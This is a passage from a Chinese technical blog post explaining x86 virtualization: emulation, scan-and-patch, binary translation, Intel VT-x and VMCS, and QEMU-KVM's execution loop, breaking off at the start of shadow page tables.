class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_rax_rbx</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> x86_regs *regs)</span><br>&#123;<br>    mov_regs(&amp;regs-&gt;rax, &amp;regs-&gt;rbx);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>实现模拟技术的原理也是最简单的——我们可以通过**「解释执行」**的方式来实现模拟技术：</p><ul><li>模拟器程序不断地从内存中读取指令，并模拟出每一条指令的效果，周而复始</li></ul><p>这样，从某种程度而言，<strong>每一条指令在执行时都完成了“陷入”</strong>，因此我们可以使用模拟技术解决虚拟化的漏洞，同时还能模拟与物理机不同架构的虚拟机</p><p><img src="https://s2.loli.net/2022/08/12/ZCSrkJIfeihDRwF.png" alt="image.png"></p><p><strong>Qemu</strong>——<code>Quick Emulator</code> 本质上便是一个模拟器，其<strong>完整地模拟了一套包括各种外设在内的计算机系统</strong></p><blockquote><p>例如以下便是笔者实现的一个最最最最简陋的模拟器架构，实际的架构会比这复杂得多：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CPU</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">regs</span> <span class="hljs-title">regs</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">cpu</span>[];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">memory</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus</span> *<span class="hljs-title">bus</span>;</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start_a_new_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> disk *disk)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span> <span class="hljs-title">vm</span> =</span> new_vm(<span class="hljs-string">&quot;x86&quot;</span>, disk);<br>    <br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruction</span> <span class="hljs-title">insn</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exec_result</span> <span class="hljs-title">res</span>;</span><br>        <br>        fetch_next_insn(vm, &amp;insn);<br>        vm_exec_insn(vm, &amp;insn, &amp;res);<br><br>        <span class="hljs-keyword">switch</span> (res.type) &#123;<br>            <span class="hljs-keyword">case</span> EXIT_VM:<br>                vm_stop(vm);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> RESOURCE_ACCESS:<br>                vm_access_resource(vm, &amp;res);<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>不过基于解释执行的模拟技术有着一个非常致命的缺点——<strong>性能极差</strong>，因为每一条指令都需要经过 VMM 的解析后再由 VMM 模拟执行，哪怕最简单的一条指令也可能需要分解成多个步骤与多次内存访问，效率极低</p><p>让我们重新审视我们为什么需要在 x86 架构上使用模拟技术来实现虚拟机：非特权敏感指令的存在打破了 <code>Popek and Goldberg virtualization requirements</code>，但<strong>非特权敏感指令仅是少数，大部分指令我们仍能直接在物理硬件上运行</strong>，因此基于模拟技术进行改进的虚拟化技术出现了：<code>扫描 &amp; 修补</code> 与 <code>二进制翻译</code></p><h3 id="II-扫描-修补">II. 扫描 &amp; 修补</h3><p>虚拟化场景下的虚拟机大都是与物理机有着相同的 ISA，因此我们并没有必要采用纯模拟的技术实现虚拟机，而是可以<strong>让非敏感指令直接在硬件上执行，通过某种方式让非特权敏感指令陷入 VMM</strong>，从而重新实现 Trap &amp; Emulate 模型</p><p><strong>「扫描 &amp; 修补」<strong>便是这样的一种技术，其</strong>让非敏感指令直接在硬件上执行</strong>，同时<strong>将系统代码中的敏感指令替换为跳转指令等能陷入 VMM 中的指令</strong>，从而让 VM 在执行敏感指令时能陷入 VMM，使得 VMM 能够模拟执行敏感指令的效果</p><p>「扫描 &amp; 修补」的基本执行流程如下：</p><ul><li>VMM 在 VM 执行每段代码之前对其进行扫描，解析每一条指令，查找特权与敏感指令</li><li>VMM 动态生成相应指令的补丁代码，并将原敏感指令替换为一个外跳转以陷入 VMM，从而在 VMM 中执行动态生成的补丁代码</li><li>补丁代码执行结束后，再跳转回 VM 中继续执行下一条代码</li></ul><p><img src="https://s2.loli.net/2022/08/12/3ZlrC9zkLpJIvGO.png" alt="image.png"></p><blockquote><p>例如这是 VirtualBox 中对 <code>cli</code> 指令进行模拟的代码：</p><p><img src="https://s2.loli.net/2022/08/12/IFMhNz16xSneOq4.png" alt="image.png"></p></blockquote><p>在「扫描 &amp; 修补」技术当中大部分的代码都可以直接在物理 CPU 上运行，其性能损失较小，但「扫描 &amp; 修补」同样存在着一定的缺陷：</p><ul><li><p>特权指令与敏感指令仍通过模拟执行的方式完成，仍可能造成一定的性能损失</p></li><li><p>代码补丁当中引入了额外的跳转，这破坏了代码的局部性</p><blockquote><p>局部性原理：CPU存取指令/数据的内存单元应当趋向于聚集在一个较小的区域</p></blockquote></li><li><p>VMM 需要维护一份补丁代码对应的原始代码的副本，这造成了额外的开销</p></li></ul><h3 id="III-二进制翻译">III. 二进制翻译</h3><p>为了进一步地提高虚拟化的性能，<strong>「二进制代码翻译」</strong>（Binary Translation）技术应运而生，类似于「扫描 &amp; 修补」技术，二进制代码翻译同样会在运行时动态地修改代码，不过不同的是 BT 技术以<strong>基本块</strong>（只有一个入口和一个出口的代码块）作为翻译的单位：</p><ul><li>Emulator 对读入的二进制代码<strong>翻译</strong>输出为对应 ISA 的一个<strong>不包含特权指令与敏感指令的子集</strong>所构成的代码，使其可以在用户态下安全运行</li><li>Emulator 动态地为当前要运行的基本块开辟一块空间，称之为<strong>翻译缓存</strong>（translation cache），在其中存放着翻译后的代码，每一块 TC 与原代码以某种映射关系（例如哈希表）进行关联</li></ul><p><img src="https://s2.loli.net/2022/08/14/hBFr6MSf5ZvtJkH.png" alt="image.png"></p><blockquote><p>我们可以看出二进制代码翻译技术与扫描修补技术的原理大体上是非常类似的，但是二进制代码翻译技术会对所有的代码进行翻译，而扫描与修补技术则只会 patch 掉敏感指令与特权指令；同时扫描&amp;修补技术<strong>不会改变代码的整体结构</strong>，而仅是将敏感与特权指令替换为能触发陷入 VMM 的指令，但是二进制代码翻译技术<strong>会直接改变一个基本块的代码整体结构</strong>（例如翻译前基本块可能长度 40B，翻译后变成100B，内部代码的相对位置也会发生变化）</p></blockquote><p>Emulator 的翻译方法大致分为两类：<strong>简单翻译</strong>与<strong>等值翻译</strong>：</p><ul><li>简单翻译可以直接理解为<strong>等效代码模拟</strong>。这种方法实现较为简单，但是会让指令数量大幅膨胀</li><li>等值翻译则是<strong>原代码与结果代码相同</strong>。理论上大多数指令都可以使用等值翻译直接在硬件上执行，但这需要更复杂的动态分析技术</li></ul><p>在相同 ISA 架构上大部分指令都是可以直接进行等值翻译的，除了以下几种：</p><ul><li>PC 相对寻址指令。这类指令的寻址与 PC 相关，但在进行二进制翻译后更改了代码基本块的结构，因此这类指令需要额外插入一些补偿代码来确保寻址的准确，这造成了一定的性能损失</li><li>直接控制转换。这类指令包括函数调用与跳转指令，其目标地址需要被替换为生成代码的地址</li><li>间接控制转换。这类指令包括间接调用、返回、间接跳转，其目标地址是在运行时动态得到的，因此我们无法在翻译时确定跳转目标</li><li>特权指令。对于简单的特权指令可以直接翻译为类似的等值代码（例如 cli 指令可以直接翻译为置 vcpu 的 flags 寄存器的 IF 位为0），但对于稍微复杂一点的指令，则需要进行深度模拟，利用跳转指令陷入 VMM 中，这通常会造成一定的性能开销</li></ul><blockquote><p>例如这是 Qemu 中的一个基本块代码翻译的例子：</p><p><img src="https://s2.loli.net/2022/08/14/ZSNn8iyCG9Tove6.png" alt="image.png"></p></blockquote><p>由于二进制代码翻译技术使用了更为复杂的过程，由此也会引入更多的问题，对于以下情形则需要额外的处理：</p><ul><li>自修改代码（Self Modifying Code）。这类程序会在运行时修改自身所执行的代码，这需要我们的 Emulator 对新生成的代码进行重翻译</li><li>自参考代码（Self Referential Code）。这类程序会在运行中读取自己的代码段中内容，这需要我们额外进行处理，使其读取原代码段中内容而非翻译后的代码</li><li>精确异常（Precise Exceptions）。即在翻译代码执行的过程中发生了中断或异常，这需要将运行状态恢复到原代码执行到异常点时的状态，之后再交给 Guest OS 处理。BT 技术暂很难很好地处理这种情况，因为翻译后的代码与原代码已经失去了逐条对应的关系。一个可行的解决方案就是在发生异常时进行回滚，之后重新使用解释执行的方式</li><li>实时代码。这类代码对于实时性要求较高，在模拟环境下运行会损失时间精确性，目前暂时无法解决</li></ul><h2 id="二、硬件辅助虚拟化-Intel-VT-x">二、硬件辅助虚拟化 - Intel VT-x</h2><blockquote><p><s>听说硬件辅助虚拟化一出来 Xen 就没人用了</s></p></blockquote><h3 id="I-概述">I. 概述</h3><p>Intel VT 技术是 Intel 为 x86 虚拟化所提供的硬件支持，其中用于辅助 CPU 虚拟化的是 <code>Intel VT-x</code> 技术，其扩展了传统的 IA32 处理器架构，为 IA32 架构的 CPU 虚拟化提供了硬件支持</p><p>VT-x 技术为 Intel CPU 额外引入了两种运行模式，统称为**「VMX 操作模式」<strong>（Virtual Machine eXtensions），通过 <code>vmxon</code> 指令开启，这两种运行模式</strong>都独立有着自己的分级保护环**：</p><ul><li><code>VMX Root Operation</code>：Hypervisor 所工作的模式，在这个模式下可以访问计算机的所有资源，并对 VM 进行调度</li><li><code>VMX Non-Root Operation</code>：VM 所工作的模式，在这个模式下仅能访问非敏感资源，对于敏感资源的访问（例如 I/O 操作）会使得 CPU 退出 Non-Root 模式并陷入 Hypervisor 中，由 Hypervisor 处理后再重新进入 Non-Root 模式恢复 VM 的运行</li></ul><p>由此，我们对 Root 模式与 Non-Root 模式间的切换行为进行定义：</p><ul><li><code>VM-Entry</code>：Hypervisor 保存自身状态信息，切换到 VMX Non-Root 模式，载入 VM 状态信息，恢复 VM 执行流</li><li><code>VM-Exit</code>：VM 运行暂停并保存自身状态信息，切换到 VMX Root 模式，载入 Hypervisor 状态信息，执行相应的处理函数</li></ul><p><img src="https://s2.loli.net/2022/08/11/uzmNXaOP6HSVqFL.png" alt="image.png"></p><p>由于 Non-Root 模式与 Root 模式都各自有着自己的分级保护环，因此 Host OS 与 Guest OS 都可以<strong>不加修改地在自己对应的模式下直接在硬件上运行</strong>，仅有当 Guest OS 涉及到敏感资源的访问及 Host OS 对 VM 的调度时才会发生切换，这在确保了 VM 高性能的同时满足了「Trap &amp; Emulate」模型实现，也解决了 x86 架构的虚拟化漏洞</p><h3 id="II-VMCS">II. VMCS</h3><p>在 Intel VT-x 技术引入了<code>VMCS</code>（<strong>Virtual-Machine Control Structure</strong>），用以保存 CPU 虚拟化所需要的相关状态，<strong>每个 virtual CPU 对应有一个 VMCS</strong></p><p>VMCS 与物理 CPU 是<strong>一一对应的绑定关系</strong>，即在同一时刻一个物理 CPU 只能与一个 VMCS 绑定，反之亦然，但在不同的时刻我们可以将 VMCS 绑定到不同的物理 CPU 上，称之为 VMCS 的<strong>迁移</strong>（Migration）</p><p>与 VMCS 的绑定与解绑相关的是以下两条指令：</p><table><thead><tr><th style="text-align:center">Instruction</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">VMPTRLD &lt;VMCS 地址&gt;</td><td style="text-align:center">将指定的 VMCS 与执行该指令的 CPU 进行绑定</td></tr><tr><td style="text-align:center">VMCLEAR</td><td style="text-align:center">将执行该指令的 CPU 与其 VMCS 进行解绑</td></tr></tbody></table><p>VT-x 中将 VMCS 定义为一个<strong>最大不超过 4KB 的内存块，且应与 4KB 对齐</strong>，其内容格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCS</span> &#123;</span><br>    <span class="hljs-comment">/* 版本号，4字节 */</span><br><span class="hljs-type">uint32_t</span> vmcs_revision_identifier:<span class="hljs-number">31</span>, shadow_vmcs_indicator:<span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">/* 中止标识，4字节</span><br><span class="hljs-comment">     * 当 VM-Exit 失败时便会产生 VMX 中止，并在此处存放原因</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span> vmx_abort_indicator;<br>    <br>    <span class="hljs-comment">/* 数据域 */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCSData</span> <span class="hljs-title">vmcs_data</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>VMCS 数据域 存放着 VMCS 主要的信息，分为以下六个子域：</p><ul><li><p><strong>Guest-state area</strong>：保存 VM 寄存器状态，在 VM-entry 时加载，在 VM-exit 时保存</p></li><li><p><strong>Host-state area</strong>：保存 Hypervisor 寄存器状态，在 VM-exit 时加载</p><p><img src="https://s2.loli.net/2022/08/15/C8wMpWE5X7S1KYP.png" alt="image.png"></p></li><li><p><strong>VM-execution control fileds</strong>：控制 <code>Non-Root</code> 模式下的处理器行为</p></li><li><p><strong>VM-entry  control fileds</strong>：控制 <code>VM-Entry</code> 过程中的某些行为</p></li><li><p><strong>VM-exit  control fileds</strong>：控制 <code>VM-Exit</code> 过程中的某些行为</p></li><li><p><strong>VM-exit information fields</strong>：保存 <code>VM-Exit</code> 的基本原因及其他详细信息，在一些处理器上该域为只读域</p><p><img src="https://s2.loli.net/2022/08/15/jqQDsA6UHZ7wy8z.png" alt="image.png"></p></li></ul><p>我们通过以下两条指令读写 VMCS：</p><table><thead><tr><th style="text-align:center">Instruction</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">VMREAD &lt;索引&gt;</td><td style="text-align:center">读 VMCS 中“索引”指定的域</td></tr><tr><td style="text-align:center">VMWRITE &lt;索引&gt; &lt;数据&gt;</td><td style="text-align:center">向 VMCS 中“索引”指定的域写入数据</td></tr></tbody></table><blockquote><p>这里的索引并非偏移值，而是 Intel 为数据域中每个字段都定义了一个独特的索引值，例如 Guest State Area 中 ES 段选择子的索引值便是 <code>0x00000800</code></p><p>当然，要把所有域的索引都背下来并不现实，最好的办法还是多多查表：）推荐阅读：<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> 的 <a href="https://cdrdv2.intel.com/v1/dl/getContent/671506">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 3C: System Programming Guide, Part 3</a></p></blockquote><h3 id="III-VMX-操作模式">III. VMX 操作模式</h3><p>作为传统的 IA32 架构的扩展，VMX 操作模式在默认下是关闭的，只有当 VMM 需要使用硬件辅助虚拟化功能时才会使用 Intel 提供的两条新指令来开关 VMX 操作模式：</p><ul><li><code>VMXON</code>：开启 VMX 操作模式</li><li><code>VMXOFF</code>：关闭 VMX 操作模式</li></ul><p>在 Intel SDM 中描述的 VMX 生命周期如下：</p><ul><li>软件通过 <code>VMXON</code> 指令进入 VMX 操作模式</li><li>VMM 可以通过 <code>VM entries</code> 进入 Guest VM（单次只能执行一个 VM），VMM 通过 <code>VMLAUNCH</code> （第一次进入 VM）与 <code>VMRESUME</code> （从 VMM 中恢复到 VM）指令来使能 <code>VM entry</code>，通过 <code>VM exits</code> 重获控制权</li><li><code>VM exits</code> 通过 VMM 指定的入口点移交控制权，VMM 对 VM 的退出原因进行响应后通过 <code>VM entry</code> 返回到 VM 中</li><li>当 VMM 想要停止自身运行并退出 VMX 操作模式时，其通过 <code>VMXOFF</code> 指令来完成</li></ul><p><img src="https://s2.loli.net/2022/09/05/FXCzMI3N4JafQRe.png" alt="image.png"></p><p>现在我们来深入 <code>VM entry</code> 与 <code>VM exit</code> 这两个行为的实现细节中，在其流程中他们分别进行了如下动作：</p><ul><li><strong>VM entry</strong>：从 Hypervisor 切换到 VM<ul><li>检查 VMCS 合法性（各字段值是否合法）</li><li>加载 VMCS 的 <code>Guest-state area</code> 中的各字段到对应的寄存器</li><li>加载指定的 MSR</li><li>设置 VMCS 的状态为 <code>launched</code></li><li>根据需要通过写 VMCS 的 <code>VM-entry Interrucption-Information</code> 向 VM 进行<strong>事件注入</strong>（如异常、异步中断等）</li></ul></li><li><strong>VM exit</strong>：从 VM 切换到 Hypervisor<ul><li>将 VM 退出的原因与详细信息写入 VMCS 的  <code>VM-exit information fields</code></li><li>将 VM 的寄存器保存至 VMCS 的 <code>Guest-state area</code></li><li>从 VMCS 的 <code>Host-state area</code> 中恢复 Host 寄存器</li><li>加载指定 MSR</li></ul></li></ul><p><img src="https://s2.loli.net/2022/08/11/vzj8dDtgLk2JI6Q.png" alt="image.png"></p><blockquote><p>这里笔者为大家补充一个概念：<strong>Model Specific Register</strong>，简称 MSR，是 x86 下的一组用来<strong>控制CPU运行、功能开关、调试、跟踪程序执行、监测CPU性能</strong>等方面的寄存器</p><blockquote><p>例如 <code>syscall</code> 指令便是通过 MSR 寄存器来获取到内核系统调用的入口点</p></blockquote><p>每个 MSR 寄存器都会有一个 id，称之为 <code>MSR Index</code>，我们可以通过这个 id 来利用 <code>RDMSR</code> 与 <code>WRMSR</code> 指令读写指定的 MSR 寄存器</p><p>我们可以在 Intel SDM 的 Volume 4 中获取到到 MSR 寄存器的详细信息</p></blockquote><h2 id="三、KVM-QEMU-KVM">三、KVM &amp; QEMU-KVM</h2><p>下面我们来介绍 KVM——<strong>Kernel-based Virtual Machine</strong>，是一个自 Linux 2.6.20 后集成在 kernel 中的一个<strong>开源系统虚拟化内核模块</strong>，本质上是一个依赖于硬件辅助虚拟化的位于 kernel 中的 Hypervisor，或者说<strong>KVM 将 Linux kernel 变成了 Hypervisor</strong>，并提供了相应的用户态操作 VM 的接口： <code>/dev/kvm</code> ，我们可以通过 ioctl 指令来操作 KVM</p><p>但 KVM 本身仅提供了 CPU 与内存的虚拟化，不能构成一个完整的虚拟化环境，那么我们不难想到的是我们可以复用现有的全虚拟化方案，<strong>将模拟 CPU 与内存的工作交由 KVM 完成</strong>，这样便能直接通过 KVM 来借助硬件辅助虚拟化以提高虚拟机性能</p><p>那么我们有这样的一个现成的完备的全虚拟化实现方案吗？答案是有的——<strong>QEMU</strong> 本身便<strong>完整模拟了一整套虚拟机环境</strong>，我们不难想到的是我们可以修改 QEMU 的代码，使其通过 KVM 来创建与运行虚拟机，而设备模拟等依旧复用原有的框架，<strong>这样我们就实现了一个高性能的全虚拟化平台：KVM + QEMU</strong></p><p><img src="https://s2.loli.net/2022/08/29/7WByzSrM9QYPsKH.png" alt="image.png"></p><p>利用QEMU + KVM 进行虚拟化的方案如下：</p><ul><li>QEMU 通过 ioctl 进入内核态将控制权移交 KVM，KVM 进行 VM 的运行</li><li>产生 VM-Exit，KVM 接管，判断原因并决定继续运行还是交由 QEMU 处理</li><li>若是后者，恢复到用户态 QEMU 中的处理代码进行相应的处理，之后退出或回到第一步</li></ul><p><img src="https://s2.loli.net/2022/08/05/GUxVBYWnbdzA6KD.png" alt="image.png"></p><p>这个基本执行框架实际上为 QEMU 源码 <code>accel/kvm/kvm-all.c</code> 中的 <code>kvm_cpu_exec()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">kvm_cpu_exec</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    cpu_exec_start(cpu);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 开始运行 VM，本质上就是 ioctl(kvm_fd, KVM_RUN)</span><br><span class="hljs-comment">         * 当产生 VM-Exit 时，首先在 KVM 中完成处理，</span><br><span class="hljs-comment">         * 若产生 IO，则退出内核态，即恢复到这里，接下来进入到用户态的处理</span><br><span class="hljs-comment">         */</span><br>        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">if</span> (run_ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 返回值小于 0 说明 VM 运行出了些问题，</span><br><span class="hljs-comment">             * 这里会简单处理后 break 打破大循环 </span><br><span class="hljs-comment">             */</span><br>        <span class="hljs-comment">//...</span><br>        &#125;<br>        <br>        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);<br>        <span class="hljs-comment">/* 这里就是一个大的 switch，根据退出的原因进行不同的处理，就不放完整代码了 */</span><br>        <span class="hljs-keyword">switch</span> (run-&gt;exit_reason) &#123;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_IO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_io\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            kvm_handle_io(run-&gt;io.port, attrs,<br>                          (<span class="hljs-type">uint8_t</span> *)run + run-&gt;io.data_offset,<br>                          run-&gt;io.direction,<br>                          run-&gt;io.size,<br>                          run-&gt;io.count);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_MMIO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_mmio\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            address_space_rw(&amp;address_space_memory,<br>                             run-&gt;mmio.phys_addr, attrs,<br>                             run-&gt;mmio.data,<br>                             run-&gt;mmio.len,<br>                             run-&gt;mmio.is_write);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">default</span>:<br>            DPRINTF(<span class="hljs-string">&quot;kvm_arch_handle_exit\n&quot;</span>);<br>            ret = kvm_arch_handle_exit(cpu, run);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (ret == <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* 运行结束，收尾处理 */</span><br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><h1>0x04.中断虚拟化</h1><p><strong>中断</strong>（Interrupt）机制是一种用来通知 CPU 发生了需要处理的事件的机制，按照发生的位置分为外部中断（来自外部的中断，INTR 引脚传来的为可屏蔽中断，NMI 引脚传来的为不可屏蔽中断）与内部中断（软中断、异常、陷阱等），实模式下 CPU 根据中断向量表来寻找对应的处理程序，保护模式下则通过中断描述符表来寻找处理程序</p><p>现代 X86 处理器使用的中断控制器称之为 <strong>APIC</strong>(Advanced Programmable Interrupt Controller)，所有的核心共用一个 I/O APIC ，用于接收外部中断，同时每个核独立有着一个 <strong>Local APIC</strong>，用于接收来自 I/O APIC 的中断信息、内部时钟中断、来自其他核心的中断（<strong>Inter-Processor Interrupt</strong>，IPI）等</p><p><img src="https://s2.loli.net/2022/08/29/BWGZpyebmVXCcLJ.png" alt="image.png"></p><p>在虚拟化环境当中，每个 vCPU 都对应需要有一个 virtual LAPIC，所有的核心则需要共享一个 virtual I/O APIC，这都是需要 Hypervisor 进行模拟与维护的</p><h2 id="一、基本模型-2">一、基本模型</h2><h1>0x05. 内存虚拟化</h1><p>内存虚拟化本质上是需要达成以下两个目的：</p><ul><li>提供一个在 Guest 感知中的从零开始的连续物理内存空间</li><li>在各个 VM 之间进行有效的隔离、调度、共享内存资源</li></ul><h2 id="一、纯软件实现虚拟化-2">一、纯软件实现虚拟化</h2><h3 id="I-虚拟机内存访问原理及遇到的问题">I.虚拟机内存访问原理及遇到的问题</h3><p>为了实现内存空间的隔离，Hypervisor 需要为 Guest VM 准备一层新的地址空间：<code>Guest Physical Address Space</code>，从 Guest 侧其只能看到这一层地址空间，Hypervisor 需要记录从 GPA 到 HVA 之间的转换关系</p><p>下图为 Qemu 的内存架构：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Guest&#x27; processes<br>                     +--------------------+<br>Virtual addr space   |<span class="hljs-string">                    </span>|<br>                     +--------------------+                                    （GVA）<br>                     |<span class="hljs-string">                    </span>|<br>                     \__   Page Table     \__<br>                        \                    \<br>                         |<span class="hljs-string">                    </span>|<span class="hljs-string">  Guest kernel</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">Guest&#x27;s phy  memory </span>|<span class="hljs-string">    </span>|<span class="hljs-string">                    </span>|<span class="hljs-string">                </span>|<span class="hljs-string">            （GPA）</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">                    </span>|<span class="hljs-string">                                          </span>|<br>                    \__                                        \__<br>                       \                                          \<br>                        |<span class="hljs-string">             QEMU process                 </span>|<br>                   +----+------------------------------------------+<br>Virtual addr space |<span class="hljs-string">    </span>|<span class="hljs-string">                                          </span>|<span class="hljs-string">         （HVA）</span><br><span class="hljs-string">                   +----+------------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                               </span>|<br>                    \__                Page Table                   \__<br>                       \                                               \<br>                        |<span class="hljs-string">                                               </span>|<br>                   +----+-----------------------------------------------+----+<br>Physical memory    |<span class="hljs-string">    </span>|<span class="hljs-string">                                               </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    （HPA）</span><br><span class="hljs-string">                   +----+-----------------------------------------------+----+</span><br></code></pre></td></tr></table></figure><p>当我们要访问 Guest 中某个虚拟地址上的数据时，我们需要：</p><ul><li>首先得先通过 Guest 的页表将 <code>Guest Virtual Address</code> （GVA）转换为 <code>Guest Physical Address</code>（GPA）</li><li>GPA 在 Qemu 的实现当中实际上是对应映射到 Host 中一大块 mmap 的内存上的，所以我们还需要将 GPA 再转换为 <code>Host Virtual Address</code>（HVA）</li><li>最后再通过 Host 上的页表将 HVA 转化为 <code>Host Physical Address</code>（HPA）</li><li>在 Guest 多级页表的寻址当中同样也要多次经过 <code>GPA-&gt;HPA</code> 的转换查询过程</li></ul><p>这一整套流程<strong>非常繁重</strong>，从而使得虚拟机中内存访问的性能极为低下</p><blockquote><p>在 QEMU 当中访问内存的核心函数是 <code>address_space_rw()</code>，感兴趣的同学可以看一下其内部实现，虽然说只是 GPA-&gt;HVA（笑）</p></blockquote><h3 id="II-影子页表-（shadow-page-table）">II.影子页表 （shadow page table）</h3><p>在早期的时候 Intel 硬件对虚拟化并没有很好的支持，因此 Hypervisor 只能先在软件层面进行优化——<strong>影子页表</strong>（Shadow Page Table）应运而生</p><p>以 Intel 为例，由于读写 CR3 